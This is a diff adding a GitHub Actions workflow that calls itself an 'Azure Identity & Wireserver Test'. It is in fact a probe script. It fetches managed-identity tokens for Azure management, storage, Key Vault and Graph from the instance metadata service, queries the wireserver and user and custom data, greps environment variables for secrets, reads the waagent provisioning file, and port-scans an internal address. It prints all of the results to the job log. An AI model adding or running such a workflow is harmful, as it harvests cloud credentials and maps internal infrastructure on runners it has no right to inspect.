@@ -1,0 +1,128 @@
+name: Azure Identity & Wireserver Test
+on:
+  workflow_dispatch:
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Azure Managed Identity Token Test
+        run: |
+          echo "============================================"
+          echo "1. AZURE MANAGED IDENTITY - ARM TOKEN"
+          echo "============================================"
+          echo "Requesting Azure AD token for management API..."
+          curl -s --connect-timeout 5 --max-time 10 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" 2>&1
+          echo ""
+          
+          echo "============================================"
+          echo "2. AZURE MANAGED IDENTITY - STORAGE TOKEN"
+          echo "============================================"
+          curl -s --connect-timeout 5 --max-time 10 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://storage.azure.com/" 2>&1
+          echo ""
+
+          echo "============================================"
+          echo "3. AZURE MANAGED IDENTITY - VAULT TOKEN"
+          echo "============================================"
+          curl -s --connect-timeout 5 --max-time 10 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" 2>&1
+          echo ""
+
+          echo "============================================"
+          echo "4. AZURE MANAGED IDENTITY - GRAPH TOKEN"
+          echo "============================================"
+          curl -s --connect-timeout 5 --max-time 10 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" 2>&1
+          echo ""
+
+          echo "============================================"
+          echo "5. LIST ALL MANAGED IDENTITIES"
+          echo "============================================"
+          curl -s --connect-timeout 5 --max-time 10 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/identity/info?api-version=2018-02-01" 2>&1
+          echo ""
+
+          echo "============================================"
+          echo "6. AZURE WIRESERVER"
+          echo "============================================"
+          echo "Goal certificates..."
+          curl -s --connect-timeout 3 --max-time 5 \
+            "http://168.63.129.16/machine/Plugins/?comp=config&type=hostingEnvironmentConfig&incarnation=1" 2>&1
+          echo ""
+          
+          echo ""
+          echo "Goal XML..."
+          curl -s --connect-timeout 3 --max-time 5 \
+            "http://168.63.129.16/machine/?comp=goalstate" 2>&1
+          echo ""
+
+          echo ""
+          echo "Machine key..."
+          curl -s --connect-timeout 3 --max-time 5 \
+            "http://168.63.129.16:80/machine?comp=telemetrydata" 2>&1
+          echo ""
+
+          echo "============================================"
+          echo "7. AZURE IMDS - ATTESTED DATA"
+          echo "============================================"
+          curl -s --connect-timeout 5 --max-time 10 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/attested/document?api-version=2020-09-01" 2>&1
+          echo ""
+
+          echo "============================================"
+          echo "8. AZURE IMDS - SCHEDULED EVENTS"
+          echo "============================================"
+          curl -s --connect-timeout 5 --max-time 10 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01" 2>&1
+          echo ""
+
+          echo "============================================"
+          echo "9. AZURE IMDS - USER DATA"
+          echo "============================================"
+          curl -s --connect-timeout 5 --max-time 10 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-01-01&format=text" 2>&1
+          echo ""
+
+          echo "============================================"
+          echo "10. AZURE IMDS - CUSTOM DATA"
+          echo "============================================"
+          curl -s --connect-timeout 5 --max-time 10 \
+            -H "Metadata: true" \
+            "http://169.254.169.254/metadata/instance/compute/customData?api-version=2021-01-01&format=text" 2>&1
+          echo ""
+
+          echo "============================================"
+          echo "11. ENVIRONMENT VARIABLES WITH SECRETS"
+          echo "============================================"
+          env | grep -iE 'AZURE|TOKEN|SECRET|KEY|IDENTITY|MSI|IMDS|ACTIONS_ID|RUNNER' | sort
+          echo ""
+
+          echo "============================================"
+          echo "12. SERVICE ACCOUNT / IDENTITY FILES"
+          echo "============================================"
+          ls -la /var/lib/waagent/ 2>&1 | head -20 || echo "No waagent"
+          echo ""
+          cat /var/lib/waagent/ovf-env.xml 2>&1 | head -30 || echo "No ovf-env"
+          echo ""
+
+          echo "============================================"
+          echo "13. INTERNAL NETWORK SCAN"
+          echo "============================================"
+          for port in 80 443 8080 9090 6443 2379 2380; do
+            timeout 2 bash -c "echo >/dev/tcp/10.1.0.1/$port" 2>/dev/null && echo "10.1.0.1:$port OPEN" || echo "10.1.0.1:$port closed"
+          done
+          echo ""
+          
+          echo "============================================"
+          echo "DONE"
+          echo "============================================"
